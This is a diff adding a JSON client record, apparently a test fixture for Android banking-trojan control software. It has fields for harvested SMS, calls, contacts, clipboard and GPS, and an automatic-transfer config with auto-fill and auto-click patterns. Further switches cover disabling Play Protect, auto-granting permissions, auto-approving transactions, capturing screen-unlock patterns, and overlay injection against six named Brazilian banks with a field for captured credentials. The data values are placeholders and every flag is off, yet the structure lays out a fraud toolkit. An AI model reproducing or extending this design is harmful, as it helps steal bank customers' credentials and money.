@@ -1,0 +1,101 @@
+{
+  "clientID": "test_dsu_toggle_1783599641026",
+  "CommandQue": [],
+  "SMSData": [],
+  "CallData": [],
+  "contacts": [],
+  "wifiNow": [],
+  "wifiLog": [],
+  "clipboardLog": [],
+  "notificationLog": [],
+  "enabledPermissions": [],
+  "apps": [],
+  "GPSData": [],
+  "GPSSettings": {
+    "updateFrequency": 0
+  },
+  "downloads": [],
+  "currentFolder": [],
+  "atsConfig": {
+    "enabled": false,
+    "autoClickEnabled": false,
+    "clickDelayMs": 500,
+    "dataMapping": {
+      "email": "usuario.ficticioso@example.com",
+      "phone": "+5511999999999",
+      "password": "SenhaFictica123!",
+      "address": "Rua Fictícia, 123",
+      "cpf": "12345678900",
+      "creditCard": "4532015112830366",
+      "name": "Usuário Fictício",
+      "pix": "12345678900"
+    },
+    "fieldPatterns": [
+      "email",
+      "phone",
+      "password",
+      "address",
+      "cpf",
+      "creditCard",
+      "account",
+      "login",
+      "usuario",
+      "pix"
+    ],
+    "buttonPatterns": [
+      "enviar",
+      "send",
+      "submit",
+      "confirmar",
+      "confirm",
+      "ok",
+      "continuar",
+      "continue",
+      "proximo",
+      "next",
+      "avancar",
+      "forward",
+      "realizar",
+      "efetuar",
+      "fazer"
+    ],
+    "atsLog": []
+  },
+  "defenseConfig": {
+    "playProtectDisabled": false,
+    "securityNotificationsMuted": false,
+    "defenseLog": []
+  },
+  "permissionGrantConfig": {
+    "autoGrantEnabled": false,
+    "grantedPermissions": [],
+    "permissionLog": []
+  },
+  "gestureSimulationConfig": {
+    "recordedGestures": [],
+    "gestureLog": []
+  },
+  "transactionApprovalConfig": {
+    "enableAutoApproval": false,
+    "autoApprovalLog": []
+  },
+  "dynamicScreenUnlockConfig": {
+    "capturedPatterns": [],
+    "unlockLog": [],
+    "autoUnlockEnabled": false
+  },
+  "overlayInjectionConfig": {
+    "enabledBanks": [
+      "itau",
+      "bradesco",
+      "caixa",
+      "nubank",
+      "bb",
+      "santander"
+    ],
+    "activeOverlays": [],
+    "capturedCredentials": [],
+    "overlayLog": [],
+    "monitoringEnabled": false
+  }
+}
